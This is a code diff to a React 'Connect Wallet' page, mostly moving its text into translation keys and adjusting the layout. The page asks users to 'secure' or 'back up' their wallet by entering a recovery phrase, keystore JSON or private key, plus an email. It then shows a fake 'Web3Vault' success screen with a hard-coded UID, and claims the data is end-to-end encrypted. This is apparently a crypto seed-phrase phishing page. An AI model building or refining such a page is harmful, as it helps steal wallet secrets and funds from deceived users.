@@ -4,6 +4,7 @@ import { useMemo, useState, useEffect } from "react";
 import Link from "next/link";
 import { supabaseUser } from "@/lib/supabaseClient";
 import Navbar from "../components/Navbar";
+import { useI18n } from "@/lib/i18n/I18nProvider";
 
 type WalletProvider = {
   id: string;
@@ -22,6 +23,7 @@ const getInitials = (name: string) =>
     .toUpperCase();
 
 export default function ConnectWalletPage() {
+  const { t } = useI18n();
   const [wallets, setWallets] = useState<WalletProvider[]>([]);
   const [isLoadingWallets, setIsLoadingWallets] = useState(true);
   const [activeWallet, setActiveWallet] = useState<string | null>(null);
@@ -75,25 +77,22 @@ export default function ConnectWalletPage() {
 
       <main className="mx-auto w-full max-w-6xl px-6 pb-24 pt-10">
         <div className="text-center">
-          <h1 className="text-3xl font-bold text-white sm:text-4xl">
-            Secure Your Wallet
-          </h1>
+          <h1 className="text-3xl font-bold text-white sm:text-4xl">{t("connect.title")}</h1>
           <div className="mx-auto mt-5 inline-flex max-w-3xl items-center justify-center rounded-2xl border border-cyan-400/20 bg-[#151129]/80 px-6 py-4 text-sm text-slate-300 shadow-[0_0_24px_rgba(34,211,238,0.15)]">
-            Refers to protecting assets, data, and transactions. Choose platforms
-            with encryption &amp; MFA.
+            {t("connect.subtitle")}
           </div>
         </div>
 
         <div className="mt-14">
-          <h2 className="text-lg font-semibold text-white">Choose Wallet</h2>
+          <h2 className="text-lg font-semibold text-white text-center">{t("connect.chooseWallet")}</h2>
           <div className="mt-6 rounded-2xl border border-white/10 bg-[#100a1f]/40 p-6 shadow-[0_12px_30px_rgba(5,8,20,0.45)]">
-            <div className="grid gap-6 sm:grid-cols-2 lg:grid-cols-4">
+            <div className="grid grid-cols-2 gap-4 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4">
               {isLoadingWallets
                 ? null
                 : wallets.map((wallet) => (
                     <div
                       key={wallet.id}
-                      className="rounded-2xl border border-white/10 bg-[#1a1130] px-6 py-6 text-center shadow-[0_10px_24px_rgba(5,8,20,0.5)] transition duration-300 ease-out hover:-translate-y-1 hover:shadow-[0_18px_36px_rgba(5,8,20,0.6)]"
+                      className="flex items-center gap-1 rounded-2xl border border-white/10 bg-[#1a1130] px-4 py-4 text-left shadow-[0_10px_24px_rgba(5,8,20,0.5)] transition duration-300 ease-out hover:-translate-y-0.5 hover:shadow-[0_18px_36px_rgba(5,8,20,0.6)]"
                       role="button"
                       tabIndex={0}
                       onClick={() => {
@@ -110,7 +109,7 @@ export default function ConnectWalletPage() {
                       }}
                     >
                       <div
-                        className={`mx-auto flex h-12 w-12 items-center justify-center rounded-full text-sm font-semibold shadow-[0_8px_16px_rgba(15,23,42,0.35)] ${
+                        className={`flex w-10 aspect-square shrink-0 items-center justify-center overflow-hidden rounded-full text-sm font-semibold shadow-[0_8px_16px_rgba(15,23,42,0.35)] ${
                           wallet.logo_url
                             ? "bg-transparent"
                             : "border border-white/10 bg-white text-[#2dd4f8]"
@@ -120,13 +119,13 @@ export default function ConnectWalletPage() {
                           <img
                             src={wallet.logo_url}
                             alt={wallet.name}
-                            className="h-12 w-12 rounded-full object-cover"
+                            className="h-full w-full rounded-full object-contain p-0.5"
                           />
                         ) : (
                           getInitials(wallet.name)
                         )}
                       </div>
-                      <div className="mt-4 text-sm font-semibold text-cyan-300">
+                      <div className="text-sm font-semibold text-cyan-300">
                         {wallet.name}
                       </div>
                     </div>
@@ -141,16 +140,16 @@ export default function ConnectWalletPage() {
           <button
             className="absolute inset-0 bg-black/70"
             onClick={resetModal}
-            aria-label="Close connect wallet modal"
+            aria-label={t("connect.modal.close")}
           />
           {modalStep === "preview" ? (
             <div className="relative w-full max-w-sm rounded-2xl border border-white/10 bg-[#1a1130] p-6 text-center shadow-[0_20px_50px_rgba(4,10,22,0.6)]">
               <div className="flex items-center justify-between text-left text-sm font-semibold text-cyan-200">
-                <span>Connect Wallet</span>
+                <span>{t("connect.modal.connectWallet")}</span>
                 <button
                   className="text-cyan-200 transition hover:text-white"
                   onClick={resetModal}
-                  aria-label="Close"
+                  aria-label={t("connect.modal.close")}
                 >
                   ✕
                 </button>
@@ -166,22 +165,19 @@ export default function ConnectWalletPage() {
                   className="mt-4 rounded-full bg-linear-to-r from-cyan-400 to-violet-500 px-6 py-2 text-sm font-semibold text-slate-900 shadow-[0_0_20px_rgba(34,211,238,0.35)]"
                   onClick={() => setModalStep("form")}
                 >
-                  Connect
+                  {t("connect.modal.connect")}
                 </button>
-                <p className="mt-4 text-xs text-rose-400">
-                  Note!! All your information and details are end-to-end
-                  encrypted on Web3
-                </p>
+                <p className="mt-4 text-xs text-rose-400">{t("connect.modal.note")}</p>
               </div>
             </div>
           ) : modalStep === "form" ? (
             <div className="relative w-full max-w-md rounded-2xl border border-white/10 bg-[#1a1130] p-6 text-center shadow-[0_20px_50px_rgba(4,10,22,0.6)]">
               <div className="flex items-center justify-between text-left text-sm font-semibold text-cyan-200">
-                <span>Connect {activeWallet}</span>
+                <span>{t("connect.form.connectPrefix")} {activeWallet}</span>
                 <button
                   className="text-cyan-200 transition hover:text-white"
                   onClick={resetModal}
-                  aria-label="Close"
+                  aria-label={t("connect.modal.close")}
                 >
                   ✕
                 </button>
@@ -189,9 +185,9 @@ export default function ConnectWalletPage() {
 
               <div className="mt-4 flex items-center justify-center gap-4 text-xs font-semibold text-slate-300">
                 {[
-                  { key: "phrase", label: "Phrase" },
-                  { key: "keystore", label: "Keystore JSON" },
-                  { key: "private", label: "Private Key" },
+                  { key: "phrase", label: t("connect.tabs.phrase") },
+                  { key: "keystore", label: t("connect.tabs.keystore") },
+                  { key: "private", label: t("connect.tabs.private") },
                 ].map((tab) => (
                   <button
                     key={tab.key}
@@ -212,13 +208,13 @@ export default function ConnectWalletPage() {
               <div className="mt-5 space-y-3 text-left text-sm">
                 <input
                   className="w-full rounded-xl border border-white/10 bg-[#120d21] px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
-                  placeholder="Enter wallet name"
+                  placeholder={t("connect.input.walletName")}
                   value={walletName}
                   onChange={(event) => setWalletName(event.target.value)}
                 />
                 <input
                   className="w-full rounded-xl border border-white/10 bg-[#120d21] px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
-                  placeholder="Enter wallet email"
+                  placeholder={t("connect.input.walletEmail")}
                   value={walletEmail}
                   onChange={(event) => setWalletEmail(event.target.value)}
                 />
@@ -226,18 +222,16 @@ export default function ConnectWalletPage() {
                   className="min-h-[110px] w-full rounded-xl border border-white/10 bg-[#120d21] px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
                   placeholder={
                     activeTab === "phrase"
-                      ? "Enter your recovery phrase"
+                      ? t("connect.input.recoveryPhrase")
                       : activeTab === "keystore"
-                        ? "Paste your keystore JSON"
-                        : "Enter your private key"
+                        ? t("connect.input.keystoreJson")
+                        : t("connect.input.privateKey")
                   }
                   value={secretValue}
                   onChange={(event) => setSecretValue(event.target.value)}
                 />
                 {activeTab === "phrase" ? (
-                  <p className="text-xs text-slate-400">
-                    Typically 12 (sometimes 24) words separated by spaces.
-                  </p>
+                  <p className="text-xs text-slate-400">{t("connect.hint.phrase")}</p>
                 ) : null}
               </div>
 
@@ -279,7 +273,7 @@ export default function ConnectWalletPage() {
                   setModalStep("success");
                 }}
               >
-                {isSubmitting ? "Submitting..." : "Submit"}
+                {isSubmitting ? t("connect.submitting") : t("connect.submit")}
               </button>
               {submitError ? (
                 <p className="mt-3 text-xs text-rose-400">{submitError}</p>
@@ -288,14 +282,23 @@ export default function ConnectWalletPage() {
                 className="mt-3 text-xs font-semibold text-cyan-200/80 hover:text-cyan-100"
                 onClick={resetModal}
               >
-                Cancel
+                {t("connect.cancel")}
               </button>
             </div>
           ) : (
             <div className="relative w-full max-w-sm rounded-2xl bg-white p-8 text-center text-slate-800 shadow-[0_20px_50px_rgba(0,0,0,0.45)]">
               <div className="mx-auto flex items-center justify-center gap-2 text-sm font-semibold text-slate-700">
-                <span className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50 text-slate-700">
-                  W
+                <span className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">
+                  <svg
+                    viewBox="0 0 24 24"
+                    className="h-5 w-5 text-cyan-600"
+                    aria-hidden="true"
+                  >
+                    <path
+                      fill="currentColor"
+                      d="M12 2 3 7v10l9 5 9-5V7l-9-5Zm0 2.2 6.8 3.8v8L12 19.8 5.2 16V8l6.8-3.8Zm0 2.2-4.6 2.6v5.4L12 17l4.6-2.6V9L12 6.4Zm0 2 2.6 1.5v3L12 14.2l-2.6-1.5v-3L12 8.4Z"
+                    />
+                  </svg>
                 </span>
                 Web3Vault
               </div>
@@ -305,24 +308,17 @@ export default function ConnectWalletPage() {
               <div className="mt-3 flex items-center justify-center gap-1 text-amber-400">
                 {"★★★★★"}
               </div>
-              <h3 className="mt-3 text-lg font-bold text-slate-900">
-                Backup Successful
-              </h3>
+              <h3 className="mt-3 text-lg font-bold text-slate-900">{t("connect.success.title")}</h3>
               <p className="mt-1 text-xs text-slate-500">
                 UID: wu1769792969700
               </p>
-              <p className="mt-3 text-sm text-slate-600">
-                Your wallet data has been successfully backed up! We&apos;ve
-                securely stored your information, ensuring your assets remain
-                protected. Feel free to continue managing your wallet or explore
-                additional features.
-              </p>
+              <p className="mt-3 text-sm text-slate-600">{t("connect.success.desc")}</p>
               <Link
                 href="/"
                 className="mt-6 inline-flex rounded-full bg-[#6d28d9] px-6 py-2 text-sm font-semibold text-white"
                 onClick={resetModal}
               >
-                Return To Home Page
+                {t("connect.success.returnHome")}
               </Link>
             </div>
           )}
